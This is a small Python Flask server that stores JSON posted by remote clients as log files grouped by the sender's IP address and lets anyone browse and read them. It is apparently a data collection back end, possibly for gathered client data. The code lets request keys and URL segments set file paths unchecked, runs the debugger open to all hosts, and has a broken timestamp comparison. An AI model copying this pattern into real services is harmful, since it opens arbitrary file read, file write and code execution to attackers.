import os
import time

from flask import Flask
from flask import request
from flask import render_template
from flask import send_from_directory

app = Flask(__name__)
log_path = app.root_path+'/clients'


def newest_ip(ip):
    m = None
    name = ''
    for p, d, fs in os.walk(os.path.join(log_path,ip)):
        for f in fs:
            tmp =  os.path.getmtime(os.path.join(p, f))
            if m < tmp:
                m = tmp
                name = f
    return time.ctime(m), name


def save_file(request):
    client_ip = request.remote_addr
    full_path = os.path.join(log_path,client_ip)
    data = request.get_json()
    if not os.path.isdir(full_path):
        os.mkdir(full_path)
    for k, v in data.items():
        with open(full_path +'/'+k+'.log', 'wb') as f:
            v = v.encode('utf-8')
            f.write(v)


@app.route('/')
def index():
    clients = []
    for d in os.listdir(log_path):
        clients.append({'dir': d, 'time': newest_ip(d)[0]})
    return render_template('index.html', clients=clients)
    

@app.route('/collect', methods=['POST'])
def collect():
    if request.method == 'POST':
        save_file(request)
        return 'Collecting!'


@app.route('/favicon.ico')
def favicon():
    return send_from_directory(app.root_path,'favicon.ico', mimetype='image/vnd.microsoft.icon')


@app.route('/<ip>')
def client(ip):
    files = os.listdir(os.path.join(log_path, ip))
    return render_template('client.html', ip=ip, files=files)


@app.route('/<ip>/<filename>')
def viewer(ip, filename):
    log = os.path.join(log_path, ip, filename)
    text = ''
    with open(log, 'rb') as f:
        text = f.read()
    text = text.decode('utf-8')
    return render_template('log.html', text=text)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)

